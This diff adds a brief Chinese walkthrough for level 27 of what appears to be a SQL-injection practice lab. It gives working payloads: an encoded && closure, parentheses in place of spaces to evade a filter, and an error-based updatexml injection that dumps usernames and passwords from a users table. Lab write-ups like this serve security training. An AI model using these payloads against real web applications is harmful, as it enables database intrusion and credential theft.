@@ -1,0 +1,16 @@
+第27关
+
+通过?id=1''判断存在单引号注入
+
+利用&&符号进行闭合
+?id=1'%26%26'1'='1
+
+空格利用（）代替
+这关有回显可以用报错注入
+
+爆出信息
+?id=1'and(updatexml(1,concat(0x7e,(sElect(group_concat(username,0x3a,password))from(users)),0x7e),1)) %26%26'1'='1
+
+
+
+闯关成功！！！
